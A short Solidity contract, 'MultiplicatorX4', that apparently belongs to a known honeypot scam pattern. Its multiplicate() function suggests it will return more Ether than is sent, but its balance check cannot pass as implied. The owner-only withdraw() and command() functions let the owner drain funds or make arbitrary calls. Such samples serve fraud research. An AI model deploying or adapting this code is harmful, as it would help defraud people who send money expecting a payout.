pragma solidity ^0.4.18;

contract MultiplicatorX4 {
    address public owner;

    function MultiplicatorX4() public {
        owner = msg.sender;
    }

    function() public payable {}

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address target, bytes data) public payable {
        require(msg.sender == owner);
        require(target.call.value(msg.value)(data));
    }

    function multiplicate(address target) public payable {
        require(msg.value >= this.balance);
        target.transfer(this.balance + msg.value);
    }
}